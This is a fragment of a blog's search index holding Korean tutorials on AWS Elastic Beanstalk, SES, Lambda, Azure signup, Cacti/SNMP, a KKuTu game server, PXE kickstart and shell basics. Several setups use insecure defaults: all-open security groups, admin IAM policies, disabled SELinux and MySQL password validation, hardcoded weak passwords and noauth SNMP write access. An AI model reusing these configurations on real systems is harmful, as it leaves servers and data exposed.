"}),a.add({id:249,href:'/docs/aws/awstraining/elasticbeanstalk/',title:"Elastic Beanstalk 사이트 구축",content:"Elastic Beanstalk 사이트 구축    이번 장에서는 Elastic Beanstalk를 활용해서 WordPress 사이트를 구축해보겠습니다. Elastic Beanstalk가 무엇인지는 Elastic Beanstalk를 참조해주세요.    Elastic Beanstalk 사이트 구축      Elastic Beanstalk는 zip 형식으로 애플리케이션을 압축해서 AWS 상에 업로드 할 수 있습니다. WordPress를 사용하기 위해 WordPress에서 zip 형식으로 다운로드 합니다.      다운로드가 완료되면 AWS에서 Elastic Beanstalk를 검색합니다.      Elastic Beanstalk의 생성을 위해 Create Application을 클릭합니다.      애플리케이션의 이름과 태그를 설정합니다.      플랫폼에서는 사용할 플랫폼을 설정할 수 있습니다. 여기서는 PHP를 선택합니다.      애플리케이션 코드에서는 코드 업로드를 클릭합니다. 소스 코드는 위에어 다운로드 한 WordPress.zip 파일을 업로드 합니다. 업로드가 완료되면 추가 옵션 구성을 클릭하여 세부설정으로 진입합니다.      ElasticBeanstalk의 구성을 위해 사용자 지정을 클릭 후 아래항목으로 이동합니다.      먼저 최하단으로 진입하여 데이터베이스 설정을 진행으르 진행 후, 네트워크 설정을 진행합니다. 네트워크 및 데이터베이스에 대한 설정은 [EC2 동적 사이트 구축) (https://mung0001.github.io/docs/cloudcomputing/awstraining/ec2site/)의 VPC 및 보안그룹을 사용하였습니다.      설정이 완료되면 다시 위로 올라와 인스턴스의 보안그룹과 키 페어를 등록합니다. 설정이 완료되면 앱 생성을 클릭하여 ElasticBeanstalk를 생성합니다.      위의 그림과 설치가 완료되면 EC2, RDS등이 설치된 것을 확인 할 수 있습니다. 다음으로는 Elastic Beanstalk의 URL를 통해 http://[ 생성한 애플리케이션 URL ]/wordpress로 진입합다.      WordPress가 설치된 것을 확인할 수 있습니다.      위의 그림과 같이 설정을 진행합니다. ElasticBeanstalk에 의해 생성된 db의 이름은 기본적으로 ebdb로 생성되어 있습니다. 데이터베이스의 호스트는 생성된 RDS의 EndPorint를 설정합니다.      다음의 웹 사이트 이름, 관리자의 대한 추가 설정을 마치면 WordPress의 생성이 완료되었습니다.    이와 같이 ElasticBeanstalk를 사용하면 AWS의 다양한 서비스와 PIP 뿐만이 아닌, 다양한 패키지들을 간단하게 생성이 가능합니다.     Elastic Beanstalk의 eb ( awsebcli ) 활용   eb 명령어는 Elastic Beanstalk 전용 CLI로, AWS CLI와 별도로 설치가 필요합니다.     $ pip install awsebcli # awsebcli 설치 $ eb --version $ awsebcli 설치확인  awsebcli를 설치합니다.     $ cd /[ WordPress 압축 푼 파일 경로 ] $ eb init -p php # php 플랫폼 지정  다운 받은 WordPress의 압축을 해제하고, 해당 디렉토리를 플랫폼으로 지정합니다.     $ eb create [ RDS 이름 ] --database --timoute 30 # eb 애플리케이션에 사용할 RDS 생성  RDS를 생성합니다.     define(\u0026#39;DB_NAME\u0026#39;, $_SERVER[\u0026#39;RDS_DB_NAME\u0026#39;]); define(\u0026#39;DB_USER\u0026#39;, $_SERVER[\u0026#39;RDS_USERNAME\u0026#39;]); define(\u0026#39;DB_PASSWORD\u0026#39;, $_SERVER[\u0026#39;RDS_PASSWORD\u0026#39;]); define(\u0026#39;DB_HOST\u0026#39;, $_SERVER[\u0026#39;RDS_HOSTNAME\u0026#39;]); define(\u0026#39;FORCE_SSL_LOGIN\u0026#39;, true); define(\u0026#39;FORCE_SSL_ADMIN\u0026#39;, true);  압축을 해제한 WordPress 디렉토리 내의 wp-config-ample.php를 복사해서 wp-config.php를 생성 후, wp-config파일을 수정합니다. 위와 동일하게 wp-includes/functions.php 또한 수정합니다.     "}),a.add({id:250,href:'/docs/aws/awstraining/ses/',title:"AWS SES 메일 시스템 구축",content:"AWS SES 메일 시스템 구축    이번 장에서는 SES로 메일을 전송하는 시스템을 구축하여 보겠습니다. 단, SES 사용을 위해서는 버지나이 북부, 오레곤, 아일랜드만이 사용이 가능합니다.    메일 시스템 구축 순서\n1. Simple Email Service ( SES ) 사용\n2. EC2 인스턴스로 메일 서버를 구축\n3. 서드 파티 도구를 사용\n   AWS SES 메일 시스템 구축      먼저, SES 서비스를 이용하기 위해 AWS에서 SES를 검색합니다.      Email Addresses \u0026gt; Verify a New Email Address를 클릭하여 인증을 진행합니다. 사용하실 메일주소를 입력 후, 인증을 진행합니다.      사용하실 메일로 접속하여 인증을 진행하면, 다음과 같이 verified 항목이 체크됩니다.      확인을 위해 등록하신 메일주소를 체크하고 상단의 Send a Test Email을 클릭합니다.      값을 입력하고 이메일을 발송합니다.      메일주소로 접속하면, 메일이 도착한 것을 확인할 수 있습니다.      좌측 메뉴의 Sending Statistics를 클릭하면 현재 메일 사용량과 제한을 알 수 있습니다. 또한 현재 그림에는 보이지 않지만 상단의 Request a Sending Limit Increase를 클릭하면 허용량을 증가시키는 것이 가능합니다. 단, 신청 시, 완료까지 평균적으로 1일의 시간이 소요됩니다.      메일함 완성 후에 업데이트 예정                          예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다.  \r\r\r "}),a.add({id:251,href:'/docs/aws/awstraining/aws-lambda-crawling/',title:"AWS Lambda Crawling",content:"AWS Lambda Crawling    AWS Lambda Crawling                     $ pip3 install [ Package ] -t . $ pip3 install bs4 -t . $ \u0026#39;[ 7z 경로, 다른 zip도 가능 ]\u0026#39; a \u0026#39;[ 압축할 패키지 이름 ]\u0026#39; \u0026#39;[ 압축할 패키지 경로 ]\u0026#39; $ \u0026#39;C:\\Program Files\\7-Zip\\7z.exe\u0026#39; a \u0026#39;C:\\AWSLambda\\bs4.zip\u0026#39; \u0026#39;.\u0026#39;                                                                                      예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다.  \r\r\r import json import urllib.request from bs4 import BeautifulSoup def lambda_handler(event, context): url = \u0026ldquo;https://www.google.com\u0026rdquo; soup = BeautifulSoup(urllib.request.urlopen(url).read(), \u0026ldquo;html.parser\u0026rdquo;) a_tags = soup.find_all(\u0026ldquo;a\u0026rdquo;) result_list = [] for i in a_tags: result_list.append(i.get_text()) return { \u0026lsquo;statusCode\u0026rsquo;: 200, \u0026lsquo;body\u0026rsquo;: json.dumps(result_list) }\n"}),a.add({id:252,href:'/docs/azure/azuretraining/base-copy-3/',title:"Azure 학생 계정생성",content:"Azure 학생 계정생성   Azure 학생 계정생성    이번 장에서는 Azure 서비스의 사용을 위한 계정생성에 대해 알아보도록 하겠습니다.\n  기본적으로 Azure의 서비스를 사용할 때에는 계정이 필요하며, 여기서 학생의 신분으로 가입을 진행할 경우 여러 혜택을 받을 수 있습니다.\n  윈도우 10 edu\n  윈도우 Server 2019\n  Visual Studio 2017 Enterprise\n  SQL Server 2017 Enterprise\n  Azure 100$ 크레딧\n    이와 같은 혜택을 받기 위해서는 학교 메일 (ac.kr or .edu)의 메일이 필요합니다.\n  그럼 학생계정으로 Azure 계정을 생성해보도록 하겠습니다.\n     Azure for Students   Azure for Students에 접속합니다. 지금 구독하기를 클릭합니다.      이메일 학번과 패스워들를 입력하면 해당 이메일의 학교로 링크가 변경됩니다.  ex) 학번@dankook.ac.kr   로그인을 진행합니다. 만약 학교계정이 없으면 일반 계정으로 진행하셔도 상관없읍니다. (학생 해택은 없음)      핸드폰 번호를 기입 후, 문자 혹은 전화를 통해 본인인증을 진행합니다.      회원가입을 진행합니다.      약관의 동의합니다.      하단과 같이 게정이 모두 설정되었다는 화면이 나오면, 생성이 완료된 것입니다.      하단과 같이 VM을 포함한 다수의 서비스를 이용할 수 있습니다.    "}),a.add({id:253,href:'/docs/system/linux/cacti01/',title:"Cacti",content:"Cacti : 시스템 네트워크 모니터링 솔루션   Cacti    Cacti는 업계 표준 오픈 소스 데이터 로깅 도구인 RRDtool에 대한 프론트 엔드용 프로그램으로 설계된, 오픈 소스 웹 기반 네트워크 모니터링 및 그래프 도구를 의미\n  Cacti는 사용자가 소정의 간격으로 서비스를 폴링하고 그 결과 데이터를 그래프로 표시할 수 있으며, 일반적으로 CPU 가부하 및 네트워크 대역폭 같은 수치를 데이터 그래프로 변환가능\n  일반적인 사용은 단순 네트워크 관리 프로토콜 SNMP를 통해 네트워크 스위치 또는 라우터 인터페이스를 폴링하여 네트워크 트래픽을 감시하는 역할을 수행\n  프론트 엔드는 각자의 그래프 세트를 가진 복수의 사용자를 처리할 수 있어서 전용 서버, 가상 개인 서버 및 코로케이션을 공급하는 웹 호스팅 제공 업체가 고객들의 대역폭 통계를 확인하기 위해 사용\n  RRDtool의 수동 구성 없이 모니터링 할 수 있는 특정 설정을 허용하여 데이터 수집 자체를 구성하는 데 사용할 수 있으며, Cacti는 쉘 스크립트 실행을 통해 다얗한 소스를 모니터링 할 수 있도록 확장이 가능\n  단, Cacti의 대부분의 구성이 자사의 웹 인터페이스를 통해 이루어지며 사용자인터페이스는 훌륭하지만, 신뢰성과 유연성 부분에서는 그리 좋은 평을 듣지 못하고 있음\n     Cacti 설치  환경   Vmware : CentOS7 2/2 cpu 4096 ram / ens33 / Cacti@localhost  $ Cacti\u0026gt; yum -y install wget net-tools vim $ Cacti\u0026gt; yum -y install epel-release $ Cacti\u0026gt; yum -y update $ Cacti\u0026gt; setenforce 0 $ Cacti\u0026gt; mv /etc/localtime /etc/localtime_org $ Cacti\u0026gt; ln -s /usr/share/zoneinfo/Asia/Seoul /etc/localtime    Apache Install  $ Cacti\u0026gt; yum -y install httpd $ Cacti\u0026gt; rm -rf /etc/httpd/conf.d/weclcome.conf $ Cacti\u0026gt; vi /etc/httpd/conf/httpd.conf ServerAdmin root@Cacti # line 86: change to admin\u0026#39;s email address ServerName www.Cacti:80 # line 95: change to your server\u0026#39;s name AllowOverride All # line 151: change DirectoryIndex index.html index.cgi index.php # line 164: add file name that it can access only with directory\u0026#39;s name ServerTokens Prod # add follows to the end # server\u0026#39;s response header $ Cacti\u0026gt; systemctl enable --now httpd # 재시작 $ Cacti\u0026gt; firewall-cmd --add-service=http --permanent $ Cacti\u0026gt; firewall-cmd --reload # 방화벽 설정    PHP Install $ Cacti\u0026gt; yum -y install php php-mbstring php-pear $ Cacti\u0026gt; vi /etc/php.ini date.timezone = \u0026#34;Asia/Seoul\u0026#34; # line 878: uncomment and add your timezone max_execution_time = 60 # line 384: uncomment and add your timezone memory_limit = 800M # line 405: uncomment and add your timezone    MySQL 5.7 Install $ Cacti\u0026gt; yum -y install http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm $ Cacti\u0026gt; yum -y install mysql-community-server $ Cacti\u0026gt; systemctl start mysqld $ Cacti\u0026gt; cat /var/log/mysqld.log | grep gen $ Cacti\u0026gt; mysql_secure_installation # 소, 대문자, 특수문자 포함 12자리 이상 $ Cacti\u0026gt; systemctl stop mysqld $ Cacti\u0026gt; systemctl set-environment MYSQLD_OPTS=\u0026#34;--skip-grant-tables\u0026#34; $ Cacti\u0026gt; systemctl start mysqld $ Cacti\u0026gt; mysql -u root $ mysql\u0026gt; UPDATE mysql.user SET authentication_string = PASSWORD(\u0026#39;Dkagh1234.\u0026#39;) WHERE User = \u0026#39;root\u0026#39; AND Host = \u0026#39;localhost\u0026#39; $ mysql\u0026gt; FLUSH PRIVILEGES; $ mysql\u0026gt; exit $ Cacti\u0026gt; systemctl stop mysqld $ Cacti\u0026gt; systemctl unset-environment MYSQLD_OPTS $ Cacti\u0026gt; systemctl start mysqld # 양식에 맞지 않게 비밀번호를 마음대로 설정하고 싶을 경우 $ Cacti\u0026gt; mysql -u root -p $ mysql\u0026gt; uninstall plugin validate_password; $ mysql\u0026gt; FLUSH PRIVILEGES; $ mysql\u0026gt; exit $ Cacti\u0026gt; vi /etc/my.cnf [mysqld] character-set-server=utf8mb4 max_allowed_packet=16777216 innodb_flush_log_at_timeout=3 innodb_read_io_threads=32 innodb_write_io_threads=16 innodb_buffer_pool_instances=17 innodb_io_capacity=5000 innodb_io_capacity_max=10000 innodb_buffer_pool_size = 2048MB max_heap_table_size= 128MB tmp_table_size= 128MB join_buffer_size= 248MB collation_server=utf8mb4_unicode_ci character-set-client-handshake = FALSE innodb_doublewrite = ON innodb_large_prefix = 1 innodb_file_format = Barracuda # add follows within [mysqld] section $ Cacti\u0026gt; systemctl enable --now mysqld $ Cacti\u0026gt; firewall-cmd --add-service=mysql --permanent $ Cacti\u0026gt; firewall-cmd --reload # 방화벽 설정    Cacti SNMP Install $ Cacti\u0026gt; yum --enablerepo=epel -y install cacti net-snmp net-snmp-utils php-mysql php-snmp rrdtool $ Cacti\u0026gt; vi /etc/snmp/snmpd.conf # 아직 수정 중! # com2sec notConfigUser default public # line 41: comment out com2sec local localhost cacti com2sec mycacti 192.168.0.0/24 cacti # line 74,75: uncomment and change # change \u0026#34;mynetwork\u0026#34; to your own network # change comunity name to anyone except public, private (for security reason) group MyRWGroup v2c local group MyROGroup v2c mycacti # line 78,79: uncomment and change view all included .1 80 # line 85: uncomment access MyROGroup \u0026#34;\u0026#34; v2c noauth exact all none none access MyRWGroup \u0026#34;\u0026#34; v2c noauth exact all all all # line 93,94: uncomment and change $ Cacti\u0026gt; systemctl enable --now snmpd $ Cacti\u0026gt; snmpwalk -v2c -c cacti localhost system # validation (replace \u0026#34;mycacti\u0026#34; to the comunity name you set) $ Cacti\u0026gt; mysql -u root -p $ mysql\u0026gt; create database cacti; $ mysql\u0026gt; grant all privileges on cacti.* to cacti@\u0026#39;localhost\u0026#39; identified by \u0026#39;Dkagh1234.\u0026#39;; $ mysql\u0026gt; grant select on mysql.* to cacti@\u0026#39;localhost\u0026#39; identified by \u0026#39;Dkagh1234.\u0026#39;; $ mysql\u0026gt; flush privileges; $ mysql\u0026gt; exit # DB create $ Cacti\u0026gt; mysql_tzinfo_to_sql /usr/share/zoneinfo | mysql -u root -p mysql \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 $ Cacti\u0026gt; mysql -u cacti -p cacti \u0026lt; /usr/share/doc/cacti-*/cacti.sql Enter password: DB User pw $ Cacti\u0026gt; vi /etc/cron.d/cacti */5 * * * * cacti /usr/bin/php /usr/share/cacti/poller.php \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 # uncomment $ Cacti\u0026gt; vi /usr/share/cacti/include/config.php $database_type = \u0026#34;mysql\u0026#34;; $database_default = \u0026#34;cacti\u0026#34;; $database_hostname = \u0026#34;localhost\u0026#34;; $database_username = \u0026#34;cacti\u0026#34;; $database_password = \u0026#34;password\u0026#34;; $database_port = \u0026#34;3306\u0026#34;; $database_ssl = false; # line 29: change to the connection info to MariaDB $ Cacti\u0026gt; vi /etc/httpd/conf.d/cacti.conf Require host localhost Require ip 192.168.0.0/24 # line 17: add access permission if need $ Cacti\u0026gt; systemctl restart httpd $ Cacti\u0026gt; mkdir /usr/local/etc/cacti $ Cacti\u0026gt; cd /var/lib/cacti/cli/ $ Cacti\u0026gt; php -q input_whitelist.php --update $ Cacti\u0026gt; php -q input_whitelist.php --audit $ Cacti\u0026gt; php -q input_whitelist.php --push # Whitelist는 아직 정리 필요    Cacti Setup   http://[IP or hostname]/cacti/접속              $ Cacti\u0026gt; $ Cacti\u0026gt; $ Cacti\u0026gt; $ Cacti\u0026gt; $ Cacti\u0026gt;   "}),a.add({id:254,href:'/docs/development/web/django/',title:"Djnago",content:"Djnago     Django\n Django란? Django Install Django DB(model) create      "}),a.add({id:255,href:'/docs/aws/awstraining/game/',title:"EC2 끄투온라인 서버 구축",content:"AWS 끄투온라인 서버 구축    AWS 끄투온라인 서버 구축      끄투 온라인은 오픈소스의 끝말잇기 게임입니다.      EC2를 생성합니다. EC2 생성은 EC2 생성을 참조해주세요.     OS 유형 disk security group     Ubuntu18.04 t2.mini 8 all-open      인스턴스를 생성 후, 아래와 같이 진행합니다.  $ sudo apt -y update $ sudo apt -y upgrade $ sudo apt -y install node.js $ sudo apt -y install npm $ npm install -g grunt grunt-cli $ sudo apt -y install postgresql $ sudo apt -y install git $ sudo git clone https://github.com/JJoriping/KKuTu.git # 서버 구축에 필요한 패키지들을 설치합니다. $ sudo su - postgres $ psql postgres=# ALTER USER postgres with encrypted password \u0026#39;qwer1234\u0026#39;; postgres=# CREATE DATABASE main; postgres-# \\l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+---------+---------+----------------------- main | postgres | UTF8 | C.UTF-8 | C.UTF-8 | postgres | postgres | UTF8 | C.UTF-8 | C.UTF-8 | template0 | postgres | UTF8 | C.UTF-8 | C.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | C.UTF-8 | C.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres # 게임 데이터의 삽입을 위한 DB를 생성합니다. # 새로운 커널 하나를 다시 킨 후 $ cd KKuTu/Server/lib/sub/ $ mv global.inc.json global.json $ mv auth.inc.json auth.json $ vi global.json \u0026#34;PASS\u0026#34;:\u0026#34;...\u0026#34;, \u0026gt;\u0026#34;PASS\u0026#34;:\u0026#34;qwer1234\u0026#34;, \u0026#34;PG_PASSWORD\u0026#34;: \u0026#34;...\u0026#34;,\u0026gt; \u0026#34;PG_PASSWORD\u0026#34;: \u0026#34;qwer1234\u0026#34;, # DB에 접속하기 위한 패스워드를 수정합니다. $ cd ~/KKuTu $ sudo -u postgres psql --quiet main \u0026lt; ./db.sql # DB를 삽입합니다. $ chmod +x server-setup.bat $ ./server-setup.bat $ node ./Server/lib/Game/cluster.js 0 1 $ ctrl + z $ bg $ disown -h $ node Server/lib/Web/cluster.js 1 $ ctrl + z $ bg $ disown -h $ netstat -anlp | grep :8496 $ netstat -anlp | grep :80 # 확인 IP ] 접속   #\n"}),a.add({id:256,href:'/docs/project/',title:"Project\u0026 Study",content:"Project    CloudComputing   빅데이터 분석 하이브리드 인프라 구축\n  OpenStack 아키텍처 분석 및 트러블슈팅\n  OpenStack 자동화 툴 LightStack 제작\n       Server\n Windows ,Linux 각 서버의 특징 및 설치, 비교       Study        "}),a.add({id:257,href:'/docs/system/linux/ls07/',title:"PXE(KickStart) Server",content:"PXE Server   PXE Server의 정의   PXE는 (Preboot Execution Enviroment)의 약자로 운영체제가 설치되지 않은 컴퓨터가 네트워크를 통해 PXE 서버에 접속해서 부팅도디도록 해주는 인터페이스를 지칭하는 용어를 의미합니다.     PXE 서버설치   PXE 설치 서버는 별도의 패키지가 존재하는 것이 아닌 각각의 서버들이 특정한 역할을 수행한다.     Server 역할     DHCP Server IP 주소를 자동으로 할당   TFTP Server 설치에 필요한 서버 구성 내용과 PXE boot 이미지는 모두 TFTP로 동작   FTP, HTTP, NFS Server CentOS DVD의 설치파일을 전송      간단한 설치순서   아무것도 설치되지 않은 PC에 전원 넣으면 자동으로 PXE 설치 서버를 찾는다.\n  나머지는 PXE 설치 서버에 설정한대로 설치가 자동으로 진행된다.\n        PXE 동작 프로세스   먼저 클라이언트가 부팅하면서 DHCP Discover 패킷을 브로드캐스트에 전송한다. 이 역할은 NIC이 수행하고 이 때 DHCP payload에 PXE Client Flag를 넣어서 보낸다.\n  수신한 서버는 DHCP offer로 응답하며, 클라이언트가 가져갈 IP 정보들에 대해 제공해준다. 이 때 일반 DHCP에 추가되어 DHCP에 사전에 설정된 Next-Server IP(TFTP서버) 정보도 함께 제공된다. TFTP 서버는 DHCP가 함께 수행해도 되고 그렇지 않을 경우 Proxy 형태로도 제공할 수 있다.\n  클라이언트는 서버로부터 받은 정보를 가지고 다시 DHCP Request를 수행한다.\n  DHCP 서버는 DHCP ACK를 통해서 최종적으로 IP정보와 TFTP 정보를 함꼐 전송한다.\n     클라이언트는 DHCP 수신 정보 가운데, TFTP 서버 정보를 보고 NBP(Network Boot Program)으로 PXE 요청을 TFTP 서버에게 보낸다.\n  서버는 요청을 받고 \u0026ldquo;Pxelinux.0\u0026quot;을 클라이언트에 응답하고 클라이언트는 해당 정보를 수신하면서 랜카드에서 메모리로 로딩을 시작한다.\n  클라이언트는 이제 실제 구성정보를 서버에게 요청한다.\n  서버는 PXE boot 이미지와 기타 구성정보가 포함된 \u0026ldquo;pxelinux.cfg\u0026quot;내용을 클라이언트에게 전송하고 클라이언트는 해당 내용을 수신한다.\n  클라이언트는 \u0026ldquo;pxelinux.cfg\u0026quot;에 구성에 포함되어 있는 커널과 PXE 이미지 파일을 요청한다.\n  서버는 클라이언트의 요청내용을 받고, 서버 내부에 TFTP 지정 디렉토리에서 PXE 커널, 부트 이미지를 클라이언트에게 로딩한다.\n  클라이언트는 PXE 커널 및 부트 이미지를 로딩하고, 추가적으로 장치에 포함된 리눅스 파일을 로딩하여 부팅을 시작한다. 이 때 kickstart 정보를 통해서 설치시 필요한 정보 (언어, 시간, 패키지, 선택, 패스워드 등)에 대해 이 파일을 참조하고 설치를 완료한다.\n      설치환경     Hostname OS Network     L1 CentOS7 192.168.10.50   null null null        PXE 구성을 위한 패키지 설치 $ L1\u0026gt; yum -y install tftp tftp-server xinetd vsftpd dhcp syslinux # PXE 구성 패키지 설치 $ L1\u0026gt; for i in ftp tftp dhcp proxy-dhcp; do firewall-cmd --permanent --add-service=$i; done $ L1\u0026gt; for i in 69/tcp 69/udp 4011/udp; do firewall-cmd --permanent --add-port=$i; done $ L1\u0026gt; firewall-cmd --reload # 방화벽 설정 $ L1\u0026gt; for i in dhcpd tftp xinetd vsftpd; do systemctl enable --now $i; done # 서비스 등록     DHCP 설정 $ L1\u0026gt; vi /etc/dhcp/dhcpd.conf # config for the PXE service ddns-update-style interim; ignore client-updates; allow booting; allow bootp; allow unknown-clients; # Top file for the Cisco DC LAB option domain-name \u0026#34;cisko-dc.com\u0026#34;; option domain-name-servers ns1.cisko-dc.com, ns2.cisko-dc.com; default-lease-time 360; max-lease-time 720; authoritative; subnet 192.168.10.0 netmask 255.255.255.0 { option routers 192.168.10.2; option subnet-mask 255.255.255.0; option domain-search \u0026#34;cisko-dc.com\u0026#34;; option domain-name-servers 8.8.8.8; range 192.168.10.150 192.168.10.199; next-server 192.168.10.100; filename \u0026#34;pxelinux.0\u0026#34;; } # PXE service를 위해서 DHCP 서비스에 추가할 항목들이 있다. 해당 부분을 기입한다. # 또한 next-server(TFTP server)와 파일 이미지를 작성한다.     ftp $ L1\u0026gt; setsebool -P allow_ftpd_full_access 1     tftp $ L1\u0026gt; vi /etc/xinetd.d/tftp service tftp { socket_type = dgram protocol = udp wait = yes user = root server = /usr/sbin/in.tftpd server_args = -s /var/lib/tftpboot disable = no per_source = 11 cps = 100 2 flags = IPv4 } # tftp 서비스 환경설정이 기본 disable=yes 로 되어 있다. 해당 정보를 disable = no로 바꾸어 서비스를 활성화한다.     Syslinux $ L1\u0026gt; cp -v /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot $ L1\u0026gt; cp -v /usr/share/syslinux/menu.c32 /var/lib/tftpboot $ L1\u0026gt; cp -v /usr/share/syslinux/memdisk /var/lib/tftpboot $ L1\u0026gt; cp -v /usr/share/syslinux/mboot.c32 /var/lib/tftpboot $ L1\u0026gt; cp -v /usr/share/syslinux/chain.c32 /var/lib/tftpboot # syslinux 설치 디렉토리에서 부트로드에 관련된 파일들을 tftpboot 디렉토리로 복제한다.     PXE Menufile $ L1\u0026gt; mkdir /var/lib/tftpboot/pxelinux.cfg $ L1\u0026gt; vi /var/lib/tftpboot/pxelinux.cfg/default # 생성된 메뉴파일 구성에 하위에 default라는 파일이 생성되며, 여기에 구성파일을 넣어 준다. # pxelinux.cfg에 직접 넣어도 관계 없다. default menu.c32 prompt 0 timeout 30 MENU TITLE cisko-dc.com PXE Menu LABEL centos7_x64 MENU LABEL CentOS 7_X64 KERNEL /networkboot/centos/vmlinuz APPEND initrd=/networkboot/centos/initrd.img inst.repo=ftp://192.168.10.100/pub/centos ks=ftp://192.168.10.100/pub/centos/centos7.cfg # KERNEL은 PXE Kernal이 위치하는 디렉토리이다. 별도로 패스를 지정하지 않으면, /etc/xinetd.d/tftp 의 환경설정에 표기된 Path를 가져가고, 예제에서 처럼 추가로 넣어주면 환경설정에 표기된 Path 뒤에 추가 생성하면 된다. # APPEND는 kernel 로딩 이후 실제 PXE boot 이미지로 path 설정은 동일하다. # inst.repo는 PXE boot이후 클라이언트가 실제로 사용할 리눅스 이미지 장소를 선언해준다. # ks는 kickstart가 위치한 장소를 선언해준다.     TFTP/FTP PXE Kernel, 이미지 및 리눅스 이미지 로딩 $ L1\u0026gt; mkdir /media/iso $ L1\u0026gt; mount CentOS-7-x86_64-Minimal-1810.iso /media/iso # 클라이언트에 설치할 리눅스 ISO를 마운트 시킨다. $ L1\u0026gt; mkdir /var/ftp/pub/centos $ L1\u0026gt; cp -r /media/iso/* /var/ftp/pub/centos/ # 설치 이미지를 ftp public 디렉토리에 전체복사를 한다. $ L1\u0026gt; ls -al /var/ftp/pub/centos/ $ L1\u0026gt; mkdir -R /var/lib/tftpboot/networkboot/centos/ $ L1\u0026gt; cp /var/ftp/pub/centos/images/pxeboot/{initrd.img,vmlinuz} /var/lib/tftpboot/networkboot/centos/ # 해당 설치 이미지 파일들 중에 pxeboot에 필요한 pxe 이미지와 커널을 tftpboot 디렉토리로 복제해 준다. # 앞서 /var/lib/tftpboot/pxelinux.cfg/default 에서 설정한 경로와 동일하면 된다.     KcikStart 구성 $ L1\u0026gt; touch /var/ftp/pub/centos/centos7.cfg $ L1\u0026gt; cp /anaconda-ks.cfg /var/ftp/pub/centos/centos7.cfg $ L1\u0026gt; chmod 755 /var/ftp/pub/centos/centos7.cfg # 현재 시스템에 사용 중인 kickstart 파일을 그대로 활용하고, 일부 수정한다. # 설치시 클라이언트가 사용하기 때문에 권한 설정을 변경해 준다. $ L1\u0026gt; openssl passwd -1 qwer1234 # kickstart 구성 이전에 해야 할 일이 있다. 이것은 kickstart 파일에 포함될 패스워드이다. # 암호화로 변경해서 복사해 둔 후 kickstart 설정시 입력한다. $ L1\u0026gt; $ L1\u0026gt; $ L1\u0026gt; $ L1\u0026gt; $ L1\u0026gt; #version=DEVEL # System authorization information auth --enableshadow --passalgo=sha512 # Use network installation url --url=\u0026#34;ftp://192.168.10.100/pub/centos/“ ### network 기반 설치로, centos가 이미지가 위치한 경로를 지정해 준다. FTP 디렉토리이다. # Use graphical install graphical # Run the Setup Agent on first boot firstboot --enable ignoredisk --only-use=sda # Keyboard layouts keyboard --vckeymap=us --xlayouts=\u0026#39;us\u0026#39;,\u0026#39;kr\u0026#39; # System language lang en_US.UTF-8 --addsupport=ko_KR.UTF-8 ## 기존에 사용중인 PXE의 환경을 그대로 수용한다. # Network information network --bootproto=dhcp --device=ens33 --activate network --hostname=localhost.localdomain ## 네트워크 환경설정 부분이다. 가상화 VM으로 ens192를 사용중이다. # Root password rootpw --iscrypted $1$JwI35htJ$4oqF0Ae5j2Esovxr7HRz5. # System services services --enabled=\u0026#34;chronyd\u0026#34; # System timezone timezone Asia/Seoul --isUtc --nontp user --groups=wheel --name=whchoi --password=$1$JwI35htJ$4oqF0Ae5j2Esovxr7HRz5./ --iscrypted --gecos=“whchoi\u0026#34; #앞서 선언한 패스워드를 root와 Admin user에게 동일하게 넣어 준다. # 시간대 설정과 시스템 서비스등을 선언한다. # System bootloader configuration bootloader --append=\u0026#34; crashkernel=auto\u0026#34; --location=mbr --boot-drive=sda autopart --type=lvm # Partition clearing information clearpart --none --initlabel # 파티션에 대한 정보도 넣어 준다. LVM으로 자동 파티션을 사용한다. %packages @^minimal @core kexec-tools net-tools chrony # 추가로 필요한 패키지를 사전에 설치할 수 있다. ISO 파일에 있는 기본 패키지를 필요한 것을 선언한다. %end %addon com_redhat_kdump --enable --reserve-mb=\u0026#39;auto\u0026#39; %end %anaconda pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty %end   레포지터리\n"}),a.add({id:258,href:'/docs/development/shell/shell01/',title:"Shell Basics",content:"Shell Programming    Shell Basics    Shell의 기본적인 역할은 사용자에게 명령을 입력받아 시행하는 것입니다.\n  Sgell은 명령문을 작성할 때 사용할 수 있도록 많은 기능을 제공하므로 실제 명령이 실행되기 전에 Shell에 의해 해석 단계를 거치게 됩니다.\n     파일명    Shell에서 제일 처음이자 중요한 개념 중 하나가 파일명입니다.\n  파일명은 곧 명령을 실행할 때 사용되는 이름과 같으며, 리눅스에서 사용하고 있는 파일시스템에서는 파일 이름을 NUL, / 두 문자를 제외하고 전부 허용한다고 합니다.\n  [ { [10 {echo if{ {AA=10} . : # 상단처럼 복잡미묘한 파일이름도 가능합니다.    공백   명령의 기본적인 구조를 살펴보면 다음과 같습니다.  command arg1 arg2 arg3 ...   최상단에 오는 명령 이름이 오고 그 다음에는 공백 그 다음 첫번째 인수 공백 두번째 인수 공백으로 분리하여 작성합니다.\n  만약 공백을 사용하지 않을 경우 정상적으로 실행되지 않습니다.\n  중요하지 않을 것 같은 이 개념은 Shell Script를 작성할 때 자주 오류의 원인이 되며, if문에서 주로 사용하는 [ 키워드 같이 생겼지만 명령으로는 동일한 명령입니다. 다만 차이점은 마지막에 인수로 ]를 붙인다는 것입니다.\n  $ [10 -eq 10 ]; echo $? [10: command not found] # [ 명령과 첫번째 인수 10을 붙여 사용하면 오류 발생 (\u0026#39;[10\u0026#39;가 명령 이름이 됩니다.])] # 옳은 설정 : [ 10 -eq 10 ]; echo $? $ [ 10 -eq 10] ; echo$? # 마지막 인수 ] 를 10과 붙여 사용하여 오류 발생 (`10]` 가 